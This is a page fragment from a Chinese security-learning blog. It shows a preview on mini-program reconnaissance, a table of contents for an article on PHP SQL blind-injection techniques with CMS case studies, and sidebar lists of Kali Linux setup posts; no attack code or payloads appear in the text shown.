class="info-item-2">019-信息打点-小程序组手&amp;开发工具&amp;依赖等</div></div><div class="info-2"><div class="info-item-1">019-信息打点-小程序组手&amp;开发工具&amp;依赖等知识点 1、Web&amp;备案信息&amp;单位名称中发现小程序2、小程序资产静态提取&amp;动态抓包&amp;动态调试解决：1、如何获取到目标小程序信息2、如何从小程序中提取资产信息  一.➢小程序获取-各大平台&amp;关键字搜索微信百度支付宝抖音头条  二.小程序主题结构1.主体结构小程序包含一个描述整体程序的 app 和多个描述各自页面的 page。一个小程序主体部分(即app)由三个文件组成，必须放在项目的根目录，如下：    文件 必需 作用    app.js 是 小程序逻辑   app.json 是 小程序公共配置   app.wxss 否 小程序公共样式表   2.一个小程序页面由四个文件组成，分别是:   xxx.js 页面逻辑    xxx.json 页面配置   xxx.wxml 页面结构   xxx.wxss 页面样式   3.项目整体目录结构   pages 页面文件夹    index 首页   logs 日志   utils util 工具类(mina框架自动生成,你也可以建立一个：...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5fcbmxlm4j30u00u9wk1.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="avatar"/></div><div class="author-info-name">0xMouise</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">105</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">专注网络安全学习与探索，记录成长与心得分享</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#044-WEB%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8-SQL%E7%9B%B2%E6%B3%A8-%E5%B8%83%E5%B0%94%E5%9B%9E%E6%98%BE-%E5%BB%B6%E6%97%B6%E5%88%A4%E6%96%AD-%E6%8A%A5%E9%94%99%E5%A4%84%E7%90%86-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E6%96%B9%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">044-WEB攻防-PHP应用&amp;SQL盲注&amp;布尔回显&amp;延时判断&amp;报错处理&amp;增删改查方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">1.演示案例：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%A0%B8%E5%BF%83%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A6%82%E8%A7%88"><span class="toc-number">1.2.</span> <span class="toc-text">2. 核心知识点概览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-PHP-MySQL-SQL-%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%EF%BC%88%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">3. PHP-MySQL-SQL 基础操作（增删改查）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E6%93%8D%E4%BD%9C%E5%AE%9A%E4%B9%89%E4%B8%8E%E5%9C%BA%E6%99%AF"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.1 操作定义与场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E8%A1%A5%E5%85%85%EF%BC%9APHP-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%EF%BC%88%E9%A3%8E%E9%99%A9%E7%89%88-vs-%E5%AE%89%E5%85%A8%E7%89%88%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2 补充：PHP 代码示例（风险版 vs 安全版）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A3%8E%E9%99%A9%E7%89%88%EF%BC%88%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">风险版（存在注入）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%89%88%EF%BC%88%E5%8F%82%E6%95%B0%E5%8C%96%E6%9F%A5%E8%AF%A2%EF%BC%89"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">安全版（参数化查询）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E4%B8%89%E7%A7%8D-SQL-%E7%9B%B2%E6%B3%A8%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.4.</span> <span class="toc-text">4. 三种 SQL 盲注技术详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%9B%B2%E6%B3%A8%EF%BC%9F"><span class="toc-number">1.4.1.</span> <span class="toc-text">什么是盲注？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84-SQL-%E7%9B%B2%E6%B3%A8%EF%BC%88%E9%9C%80%E9%A1%B5%E9%9D%A2%E5%9B%9E%E6%98%BE%E5%8F%98%E5%8C%96%EF%BC%89"><span class="toc-number">1.4.2.</span> <span class="toc-text">4.1 基于布尔的 SQL 盲注（需页面回显变化）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%87%BD%E6%95%B0%EF%BC%88%E5%90%AB%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8A-%E7%A4%BA%E4%BE%8B%EF%BC%89"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">核心函数（含详细解释 + 示例）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4%EF%BC%88%E5%AE%9E%E6%88%98%E7%A4%BA%E4%BE%8B%EF%BC%89"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">注入步骤（实战示例）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.4.2.4.</span> <span class="toc-text">适用场景</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84-SQL-%E7%9B%B2%E6%B3%A8%EF%BC%88%E6%97%A0%E9%9C%80%E5%9B%9E%E6%98%BE-%E6%8A%A5%E9%94%99%EF%BC%89"><span class="toc-number">1.4.3.</span> <span class="toc-text">4.2 基于时间的 SQL 盲注（无需回显 &#x2F; 报错）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">核心函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%EF%BC%88%E5%B8%A6%E8%AF%B4%E6%98%8E%EF%BC%89"><span class="toc-number">1.4.3.3.</span> <span class="toc-text">注入语句（带说明）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">1.4.3.4.</span> <span class="toc-text">注意事项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF-1"><span class="toc-number">1.4.3.5.</span> <span class="toc-text">适用场景</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84-SQL-%E7%9B%B2%E6%B3%A8%EF%BC%88%E9%9C%80%E5%BC%80%E5%90%AF%E9%94%99%E8%AF%AF%E6%98%BE%E7%A4%BA%EF%BC%89"><span class="toc-number">1.4.4.</span> <span class="toc-text">4.3 基于报错的 SQL 盲注（需开启错误显示）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%87%BD%E6%95%B0%EF%BC%88%E6%8A%A5%E9%94%99%E5%8E%9F%E7%90%86-%E7%A4%BA%E4%BE%8B%EF%BC%89"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">核心函数（报错原理 + 示例）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4%EF%BC%88%E4%BB%A5-updatexml-%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="toc-number">1.4.4.3.</span> <span class="toc-text">注入步骤（以 updatexml 为例）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF-2"><span class="toc-number">1.4.4.4.</span> <span class="toc-text">适用场景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%EF%BC%9A%E5%A6%82%E4%BD%95%E5%85%B3%E9%97%AD%E9%94%99%E8%AF%AF%E6%98%BE%E7%A4%BA%EF%BC%88%E9%98%B2%E5%BE%A1%EF%BC%89"><span class="toc-number">1.4.4.5.</span> <span class="toc-text">补充：如何关闭错误显示（防御）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-%E4%B8%89%E7%A7%8D%E7%9B%B2%E6%B3%A8%E5%AF%B9%E6%AF%94%EF%BC%88%E8%A1%A8%E6%A0%BC%E4%BC%98%E5%8C%96%EF%BC%89"><span class="toc-number">1.4.5.</span> <span class="toc-text">4.4 三种盲注对比（表格优化）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-PHP-MySQL-%E6%B3%A8%E5%85%A5%E6%9D%A1%E4%BB%B6%E4%B8%8E%E5%88%A4%E6%96%AD"><span class="toc-number">1.5.</span> <span class="toc-text">5. PHP-MySQL 注入条件与判断</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E6%A0%B8%E5%BF%83%E5%88%A4%E6%96%AD%E6%A0%87%E5%87%86%EF%BC%88%E8%A1%A5%E5%85%85%E5%8E%9F%E7%90%86%EF%BC%89"><span class="toc-number">1.5.1.</span> <span class="toc-text">5.1 核心判断标准（补充原理）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95%E4%BC%98%E5%85%88%E9%80%89%E6%8B%A9%EF%BC%88%E9%9D%A2%E8%AF%95%E9%A2%98%E8%A7%A3%E7%AD%94%E4%BC%98%E5%8C%96%EF%BC%89"><span class="toc-number">1.5.2.</span> <span class="toc-text">5.2 黑盒测试优先选择（面试题解答优化）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%AE%9E%E6%88%98-CMS-%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90%EF%BC%88%E6%AD%A5%E9%AA%A4%E4%BC%98%E5%8C%96-%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%89"><span class="toc-number">1.6.</span> <span class="toc-text">6. 实战 CMS 案例解析（步骤优化 + 补充说明）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E6%A1%88%E4%BE%8B-1%EF%BC%9Axhcms-%E6%8F%92%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88Insert-%E6%93%8D%E4%BD%9C%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">1.6.1.</span> <span class="toc-text">6.1 案例 1：xhcms - 插入报错注入（Insert 操作注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">目标</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.6.1.2.</span> <span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4%EF%BC%88%E8%A1%A5%E5%85%85%E5%85%B3%E9%94%AE%E8%A7%A3%E9%87%8A%EF%BC%89"><span class="toc-number">1.6.1.3.</span> <span class="toc-text">详细步骤（补充关键解释）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.1.4.</span> <span class="toc-text">案例总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-%E6%A1%88%E4%BE%8B-2%EF%BC%9Akkcms-%E5%88%A0%E9%99%A4%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%EF%BC%88Delete-%E6%93%8D%E4%BD%9C%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">1.6.2.</span> <span class="toc-text">6.2 案例 2：kkcms - 删除延时注入（Delete 操作注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87-1"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">目标</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87-1"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4%EF%BC%88%E8%A1%A5%E5%85%85%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E%EF%BC%89"><span class="toc-number">1.6.2.3.</span> <span class="toc-text">详细步骤（补充工具使用说明）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.6.2.4.</span> <span class="toc-text">关键知识点</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-xhcms-kkcms-%E6%90%AD%E5%BB%BA%E8%A1%A5%E5%85%85%EF%BC%88%E6%96%B0%E6%89%8B%E5%8F%8B%E5%A5%BD%E7%89%88%EF%BC%89"><span class="toc-number">1.7.</span> <span class="toc-text">7. xhcms&#x2F;kkcms 搭建补充（新手友好版）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-xhcms-%E6%90%AD%E5%BB%BA%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.7.1.</span> <span class="toc-text">7.1 xhcms 搭建步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-kkcms-%E6%90%AD%E5%BB%BA%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.7.2.</span> <span class="toc-text">7.2 kkcms 搭建步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E4%B8%8E%E4%BC%98%E5%8C%96%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.8.</span> <span class="toc-text">8. 常见问题与优化建议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-1-%E6%B3%A8%E5%85%A5%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-number">1.8.1.</span> <span class="toc-text">8.1 注入时遇到的问题及解决方案</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/09/16/(eval)1%20_python-argcomplete%20function%20definition%20file%20not%20found/" title="(eval)1 _python-argcomplete function definition file not found"><img src="https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/009b6JyXly1i5fd15gq7dj31hc0xce81.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="(eval)1 _python-argcomplete function definition file not found"/></a><div class="content"><a class="title" href="/2025/09/16/(eval)1%20_python-argcomplete%20function%20definition%20file%20not%20found/" title="(eval)1 _python-argcomplete function definition file not found">(eval)1 _python-argcomplete function definition file not found</a><time datetime="2025-09-16T07:48:08.000Z" title="发表于 2025-09-16 15:48:08">2025-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/16/Kali%20Linux%20%E7%B3%BB%E7%BB%9F%E5%9C%A8%E6%89%A7%E8%A1%8C%20sudo%20apt-get%20update%20%E6%97%B6%E5%87%BA%E7%8E%B0%E4%BA%86%20GPG%20%E5%85%AC%E9%92%A5%E7%BC%BA%E5%A4%B1%E9%94%99%E8%AF%AF/" title="Kali Linux 系统在执行 sudo apt-get update 时出现了 GPG 公钥缺失错误"><img src="https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmwmxmj31hc0u07wh.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="Kali Linux 系统在执行 sudo apt-get update 时出现了 GPG 公钥缺失错误"/></a><div class="content"><a class="title" href="/2025/09/16/Kali%20Linux%20%E7%B3%BB%E7%BB%9F%E5%9C%A8%E6%89%A7%E8%A1%8C%20sudo%20apt-get%20update%20%E6%97%B6%E5%87%BA%E7%8E%B0%E4%BA%86%20GPG%20%E5%85%AC%E9%92%A5%E7%BC%BA%E5%A4%B1%E9%94%99%E8%AF%AF/" title="Kali Linux 系统在执行 sudo apt-get update 时出现了 GPG 公钥缺失错误">Kali Linux 系统在执行 sudo apt-get update 时出现了 GPG 公钥缺失错误</a><time datetime="2025-09-16T07:48:08.000Z" title="发表于 2025-09-16 15:48:08">2025-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/16/Kali%20%E5%AD%97%E4%BD%93%E5%A4%A7%E5%B0%8F%E8%AE%BE%E7%BD%AE/" title="Kali 字体大小设置"><img src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5fcbmvo6mj31hc0u04qp.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="Kali 字体大小设置"/></a><div class="content"><a class="title" href="/2025/09/16/Kali%20%E5%AD%97%E4%BD%93%E5%A4%A7%E5%B0%8F%E8%AE%BE%E7%BD%AE/" title="Kali 字体大小设置">Kali 字体大小设置</a><time datetime="2025-09-16T07:48:08.000Z" title="发表于 2025-09-16 15:48:08">2025-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/16/Kali%E7%9A%84KDE%E6%A1%8C%E9%9D%A2%E7%8E%AF%E5%A2%83%E5%90%AF%E7%94%A8%E4%BB%8E%E4%B8%BB%E6%9C%BA%E5%90%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%B7%A8%E7%B3%BB%E7%BB%9F%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E6%8B%96%E5%8A%A8%E6%96%87%E4%BB%B6%E6%95%99%E7%A8%8B/" title="Kali的KDE桌面环境启用从主机向虚拟机跨系统复制粘贴拖动文件教程"><img src="https://image.baidu.com/search/down?url=https://wx2.sinaimg.cn/large/009b6JyXly1i5ff9rz4hqj31hc0xcqv5.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="Kali的KDE桌面环境启用从主机向虚拟机跨系统复制粘贴拖动文件教程"/></a><div class="content"><a class="title" href="/2025/09/16/Kali%E7%9A%84KDE%E6%A1%8C%E9%9D%A2%E7%8E%AF%E5%A2%83%E5%90%AF%E7%94%A8%E4%BB%8E%E4%B8%BB%E6%9C%BA%E5%90%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%B7%A8%E7%B3%BB%E7%BB%9F%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E6%8B%96%E5%8A%A8%E6%96%87%E4%BB%B6%E6%95%99%E7%A8%8B/" title="Kali的KDE桌面环境启用从主机向虚拟机跨系统复制粘贴拖动文件教程">Kali的KDE桌面环境启用从主机向虚拟机跨系统复制粘贴拖动文件教程</a><time datetime="2025-09-16T07:48:08.000Z" title="发表于 2025-09-16 15:48:08">2025-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/16/OutGuess%20%E5%AE%89%E8%A3%85%E4%B8%8E%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5%E6%8C%87%E5%8D%97%EF%BC%88Kali%20Linux%20%E7%8E%AF%E5%A2%83%EF%BC%89/" title="OutGuess 安装与问题排查指南（Kali Linux 环境）"><img src="https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fd15ffjaj31hc0xcqth.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="OutGuess 安装与问题排查指南（Kali Linux 环境）"/></a><div class="content"><a class="title" href="/2025/09/16/OutGuess%20%E5%AE%89%E8%A3%85%E4%B8%8E%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5%E6%8C%87%E5%8D%97%EF%BC%88Kali%20Linux%20%E7%8E%AF%E5%A2%83%EF%BC%89/" title="OutGuess 安装与问题排查指南（Kali Linux 环境）">OutGuess 安装与问题排查指南（Kali Linux 环境）</a><time datetime="2025-09-16T07:48:08.000Z" title="发表于 2025-09-16 15:48:08">2025-09-16</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5ff9rxengj31hc0xc1kx.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By 0xMouise</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0</a></span></div><div class="footer_custom_text">如果身体是瑕疵的半成品 那就让灵魂成为永远燃烧的永动机</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="用我三生烟火，换你一世迷离,长街长，烟花繁，你挑灯回看,回得了过去，回不了当初,抬头看，人生是星辰大海,当你想要放弃时，想想当初为什么开始,因为现在的坚持正在重塑未来的你,抬头看，人生是星辰大海,你最大的冒险，是过你梦想的生活,等待完美条件的人永远无法开始,认知的边界就是命运的边界,在长大，在失去，在努力，在接受，在好好生活,如果身体是瑕疵的半成品 那就让灵魂成为永远燃烧的永动机,纵有狂风拔地起 我亦乘风破万里,汗水不会辜负你的期待,享受你每一次锻炼完后的肌肉酸痛,因为这意味昨天那个预示着懦弱你的已经被你杀死了,肌肉的酸痛预示着懦弱的离场,当你快坚持不住的时候 困难也快坚持不住了,有些事不是看到了希望才努力，而是努力了才看到了希望,在无人问津的地方历练，在万众瞩目的地方出现,破茧成蝶必经淬炼,一颗向上跳动的心脏，不该有一副下坠的躯体,向下的躯体无法承载向上的灵魂,一个人要想成长你的意志力和身体都得尽力磨砺,宝剑锋从磨砺出梅花香自苦寒来" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
